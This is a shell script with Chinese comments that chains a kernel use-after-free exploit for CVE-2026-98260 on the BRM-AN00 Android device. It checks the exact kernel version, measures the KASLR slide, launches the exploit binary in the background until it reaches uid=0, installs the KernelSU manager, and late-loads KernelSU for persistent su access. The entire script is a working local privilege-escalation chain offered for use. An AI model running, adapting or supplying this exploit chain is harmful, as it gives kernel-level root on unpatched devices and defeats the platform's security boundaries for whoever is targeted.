#!/bin/sh
# AN00 (BRM-AN00, 6.18.21-android17) CVE-2026-98260 + KernelSU 3.3.1 late-load
set -eu
D=/data/local/tmp/brm-an00
LOG=$D/uaf.log
mkdir -p $D
chmod 755 $D

KERNEL='6.18.21-android17-5-ge186062ea75f-abogki564062290-4k'
LINK='0xffffffc0803e1fd0'

[ "$(uname -r)" = "$KERNEL" ] || { echo "FAIL: 内核不匹配 $(uname -r)"; exit 1; }

# 已在 root 则跳过
already=$(/system/bin/su -c id 2>/dev/null || true; $D/ksud debug info 2>/dev/null || true)
if echo "$already" | grep -q 'uid=0' && echo "$already" | grep -q 'late_load: true'; then
  echo "已 root，跳过"
  exit 0
fi

for f in uaf_plant_replay slide_probe pc98260-su cap_check ksud; do
  [ -f "$D/$f" ] || { echo "FAIL: 缺少 $D/$f"; exit 1; }
done
chmod 755 $D/uaf_plant_replay $D/slide_probe $D/pc98260-su $D/cap_check $D/ksud

if ! $D/pc98260-su -c id 2>/dev/null | grep -q 'uid=0'; then
  # KASLR 测量
  probe=$($D/slide_probe || true)
  echo "$probe"
  site=$(printf '%s\n' "$probe" | sed -n 's/.*site=\(0x[0-9a-fA-F][0-9a-fA-F]*\).*/\1/p' | head -1)
  [ -n "$site" ] || { echo "FAIL: slide probe 失败"; exit 1; }
  slide=$((site - LINK))
  [ "$slide" -gt 0 ] || { echo "FAIL: slide 非法"; exit 1; }
  slideHex=$(printf '0x%x' "$slide")
  echo "slide=$slideHex"

  # 后台跑 exploit（setsid 脱离，防父进程被杀带走）
  rm -f $LOG
  toybox setsid sh -c "$D/uaf_plant_replay --slide $slideHex > $LOG 2>&1 < /dev/null" >/dev/null 2>&1 &
  echo "exploit 后台运行，等待 uid=0 ..."

  ok=0 i=0
  while [ "$i" -lt 60 ]; do
    sleep 2
    log=$(cat $LOG 2>/dev/null || true)
    case "$log" in
      *'child-cred] uid=0'*) ok=1; break;;
      *'holding zombie'*|*'leak failed'*|*'pointer was not'*|*'uid fix was not'*) echo "$log"; echo "FAIL: exploit 失败"; exit 1;;
    esac
    i=$((i+1))
  done
  [ "$ok" = 1 ] || { echo "FAIL: 等待 uid=0 超时"; cat $LOG 2>/dev/null || true; exit 1; }
  $D/pc98260-su -c id | grep -q 'uid=0' || { echo "FAIL: root socket 未就绪"; exit 1; }
fi

# 已有 KernelSU 管理器则用现有的，否则装 ksu.apk
if ! pm path me.weishu.kernelsu 2>/dev/null | grep -q package:; then
  [ -f $D/ksu.apk ] || { echo "FAIL: 缺少 ksu.apk"; exit 1; }
  echo "安装 KernelSU 管理器..."
  pm install -r $D/ksu.apk >/dev/null || { echo "FAIL: 安装 KernelSU 管理器失败"; exit 1; }
fi

# 用临时 root 跑 ksud late-load（KernelSU 3.3.1，android17-6.18）
late=$($D/pc98260-su -c "$D/ksud late-load --kmi android17-6.18 --package-name me.weishu.kernelsu --allow-shell; echo LATE_EXIT=\$?" 2>/dev/null || true)
echo "$late"
echo "$late" | grep -q 'LATE_EXIT=0' || { echo "FAIL: late-load 失败"; exit 1; }

# 验证
info=$($D/ksud debug info 2>/dev/null || true; /system/bin/su -c id 2>/dev/null || true; getenforce 2>/dev/null || true)
echo "$info"
echo "$info" | grep -q 'late_load: true' || { echo "FAIL: late_load 未生效"; exit 1; }
echo "$info" | grep -q 'uid=0' || { echo "FAIL: su 未就绪"; exit 1; }
echo "AN00 root 完成，请打开 KernelSU 管理器确认。重启后需重跑。"
